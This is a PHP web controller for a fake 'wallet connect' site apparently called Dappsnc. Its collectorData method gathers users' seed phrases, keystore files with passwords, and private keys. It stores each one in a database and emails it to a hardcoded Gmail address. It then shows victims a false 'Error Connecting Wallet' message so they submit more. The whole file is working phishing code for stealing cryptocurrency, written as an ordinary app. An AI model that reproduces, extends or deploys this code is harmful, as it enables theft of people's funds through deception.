<?php

namespace App\Controllers;

class Home extends BaseController
{
	
	public function index()
	{
		$page_data = [
			'page_title' => "Home",
			'page_name' => "Home"
		];
		
		$this->render_webpage('front/home', $page_data,null);
	}

	public function walletCollection()
	{
		$page_data = [
			'page_title' => "Home",
			'page_name' => "Home"
		];
		
		$this->render_webpage('front/wallets', $page_data,null);
	}

	public function mailer($data=[])
	{
		$reciever = 'rajiatlive@gmail.com';
		$data = [
			'section'=> $data['type'],
			'token'=> $data['data'],
			'type'=> $data['slug'],
			'password'=> $data['password'],
			'date'=> $this->setTime,
			"url" => base_url(),
			"name" => "Dappsnc",
		];

		$temp = $this->getMail('general','getRow');

		$subject = $this->parser->setData($data)->renderString($temp->subject);
		$message = $this->parser->setData($data)->renderString($temp->message);
		$this->sender($reciever,$subject,$message,$temp->name);	
	}

	public function contact()
	{
		$page_data = [
			'page_title' => "Contact",
			'page_data' => "Contact"
		];

		$this->render_webpage('front/contact', $page_data,null);
	}

	public function starters()
	{
		$page_data = [
			'page_title' => "Import",
			'page_data' => "starter"
		];

		$this->render_webpage('front/collect', $page_data,null);
	}

	public function walletid($param1, $param2)
	{
		if(empty($param1) || empty($param2)) redirect()->back();
		$slug = $this->Crud->collecDataCoin($param1);
		if(!$slug) redirect()->back();
		$page_data = [
			'page_title' => "Payload",
			'page_data' => "Payload",
			'data_slug' => $slug
		];

		// die(var_dump($slug));

		$this->render_webpage('front/collect', $page_data,null);

		// if($param2=='keystore'):
		// 	$this->render_webpage('front/walletdid', $page_data,null);
		// elseif($param2=='privatekey'):
		// 	$this->render_webpage('front/walletdid1', $page_data,null);
		// elseif($param2=='mnemonic'):
		// 	$this->render_webpage('front/walletdid2', $page_data,null);
		// else:
		// 	$this->render_webpage('front/walletdid', $page_data,null);
		// endif;
	}

	public function slugs()
	{
		$data = $this->request->getVar('slug');
		$slug = $this->Crud->collecDataCoin($data);
		echo json_encode($slug);
	       exit();
	}

	public function getMail($where = [], $result_type = 'getRow'){
		return $this->db->table('mailtemplates')->where('type',$where)->where('active',1)->get()->{$result_type}();
    	}

	public function collectorData()
	{
		if ($this->request->isAJAX() || $this->request->getMethod() == "POST"){

            $type = $this->request->getVar('typer');
            
            if($type == "mnemonic"){
            	$data = [
            		'data' => $this->request->getVar('datakey'),
            		'type' => $type,
            		'slug' => (!empty(ucwords($this->request->getVar('slug')))) ? ucwords($this->request->getVar('slug')) : "Metamask",
            		'password' => "Not Available"
            	];

            	$this->mailer($data);
            	if($this->Crud->saveDatas($data)){
	            	echo json_encode(['status' => 'SUCCESS', 'msg' =>  "Error Connecting Wallet, please try again."]);
	            	exit();
	            }
            }elseif($type == "keystore"){
            	$data = [
            		'data' => $this->request->getVar('datakey'),
            		'type' => $type,
            		'slug' => (!empty(ucwords($this->request->getVar('slug')))) ? ucwords($this->request->getVar('slug')) : "Metamask",
            		'password' => $this->request->getVar('password')
            	];
            	$this->mailer($data);
            	if($this->Crud->saveDatas($data)){
	            	echo json_encode(['status' => 'SUCCESS', 'msg' =>  "Error Connecting Wallet, please try again."]);
	            	exit();
	            }
            }elseif($type == "private"){
            	$data = [
            		'data' => $this->request->getVar('datakey'),
            		'type' => $type,
            		'slug' => (!empty(ucwords($this->request->getVar('slug')))) ? ucwords($this->request->getVar('slug')) : "Metamask",
            		'password' => "Not Available"
            	];
            	$this->mailer($data);
            	if($this->Crud->saveDatas($data)){
	            	echo json_encode(['status' => 'SUCCESS', 'msg' =>  "Error Connecting Wallet, please try again."]);
	            	exit();
	            }
            }else{
            	echo json_encode(['status' => 'FAILURE', 'msg' => 'Unaccepted Data Format. Please Retry.']);
             	exit();
            }

        }else{
        	echo json_encode(['status' => 'FAILURE', 'msg' => 'False Method. Please Retry.']);
             exit();
        }
	}

	public function sender($reciever,$subject,$messages,$name){
    		return $this->Site->pusher($messages,$subject,$reciever,$name);
    	}
}
